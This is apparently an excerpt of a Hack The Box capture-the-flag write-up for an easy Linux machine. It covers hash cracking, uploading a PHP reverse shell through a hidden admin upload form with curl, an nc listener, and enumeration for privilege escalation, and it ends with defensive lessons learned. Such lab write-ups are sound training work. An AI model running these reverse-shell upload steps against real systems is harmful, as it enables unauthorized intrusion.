...
Platform: Hack The Box Difficulty: Easy OS: Linux Category: Web Exploitation → Privilege Escalation
...
Cracked the password hash using CrackStation — revealing a weak, easily-guessable password.
...
🐚 Gaining a Shell
Downloaded a trusted PHP reverse shell from pentestmonkey, set IP = 10.10.14.250 and PORT = 3388.
Started a listener:
bash
nc -lvnp 3388
Uploaded the payload via the hidden form:
bash
curl -X POST "http://10.129.118.166/admin/upload.php?path=" \
  -H "Cookie: <session_cookie_from_login>" \
  -F "file[]=@shell.php"
Triggered execution by browsing to the uploaded file's path, causing the target to connect back to the listener.
...
Ran LinEnum.sh for automated enumeration:
...
[root.txt content]
📝 Lessons Learned
Version fingerprinting matters — a visible date and CMS branding was enough to identify the exact vulnerable version.
Sensitive files must never be web-accessible — an exposed XML file with a crackable password hash gave away admin access entirely.
Hiding a feature in the UI is not a security control — the upload form existed in the HTML regardless of button visibility and was fully exploitable via a manual request.
Least privilege for sudo rules — granting NOPASSWD access to an interpreter (PHP, Python, Perl, etc.) is functionally equivalent to unrestricted root access.
🛠️ Tools Used
